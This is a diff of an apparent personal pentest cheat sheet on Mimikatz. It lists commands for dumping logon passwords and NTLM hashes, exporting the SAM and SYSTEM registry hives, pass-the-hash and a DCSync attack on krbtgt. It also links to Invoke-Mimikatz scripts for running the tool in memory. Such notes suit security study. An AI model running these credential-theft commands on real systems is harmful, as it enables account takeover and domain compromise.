@@ -1,7 +1,7 @@
 
 ![[Pasted image 20260227171733.png]]
 
-> [!info]- Log Module – Save Command Output
+> [!info]+ Log Module – Save Command Output
 > Allows saving Mimikatz session output to a file.
 > ---
 > ## Start Logging
@@ -701,6 +701,7 @@
 > mimikatz # privilege::debug
 > mimikatz # !+
 > mimikatz # !ping
+> mimikatz # !bsod // blue screen
 > ```
 >
 > Test or dangerous functions:
@@ -725,10 +726,10 @@
 >
 > ```bash
 > mimikatz # privilege::debug
+> mimikatz # sekurlsa::
 > mimikatz # sekurlsa::msv
 > mimikatz # sekurlsa::logonpasswords
 > ```
->
 > - `msv` → NTLM hashes  
 > - `logonpasswords` → all available providers
 
@@ -765,10 +766,8 @@
 > Export registry hives:
 >
 > ```cmd
-> reg save HKLM\SYSTEM system
-> reg save HKLM\SAM sam
+> reg save HKLM\SYSTEM system & reg save HKLM\SAM sam
 > ```
->
 > Dump using Mimikatz:
 >
 > ```bash
@@ -803,6 +802,7 @@
 > - VPN credentials
 > - RDP private keys
 > - Service account secrets
+
 ### Pass-The-Hash Attack
 
 > [!warning]- Pass-The-Hash (PTH)
@@ -822,8 +822,7 @@
 ## DC ATTACK
 ---
 
-
-> [!info]- Kerberos Overview
+> [!info]+ Kerberos Overview
 > **KDC (Key Distribution Center)** runs on the Domain Controller and handles authentication and ticket issuance.
 >
 > ---
@@ -1179,9 +1178,10 @@
 >#### 3. `lsadump::dcsync`
 Uses the obtained DC authentication to perform a DCSync attack and retrieve password hashes (e.g., `krbtgt`), potentially leading to full domain compromise.
 
-
 ## Commands list
 
+> [!info] Overview Command 
+> 
 | Command                     | Definition                                                                                                                                                                                                                                                                                                                                         |
 | --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | CRYPTO::Certificates        | list/export certificates                                                                                                                                                                                                                                                                                                                           |
@@ -1207,9 +1207,15 @@ Uses the obtained DC authentication to perform a DCSync attack and retrieve pass
 | TOKEN::Elevate              | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box                                                                                                                                                                                                                                       |
 | TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.                                                                                                                                                                                                                                                                                                 |
 
-## Powershell version
 
-Mimikatz in memory (no binary on disk) with:
+## Executable Version
+
+- [Gentikiwi](https://github.com/gentilkiwi/mimikatz/wiki)
+- [Zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad)
+
+## PS Version
+
+mimikatz in memory (no binary on disk) with:
 
 - [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
 - [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit
@@ -1217,8 +1223,3 @@ Mimikatz in memory (no binary on disk) with:
 More information can be grabbed from the Memory with:
 
 - [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)
-
-##### Resource
-
-link: https://github.com/gentilkiwi/mimikatz/wiki
-link: https://zer1t0.gitlab.io/posts/attacking_ad
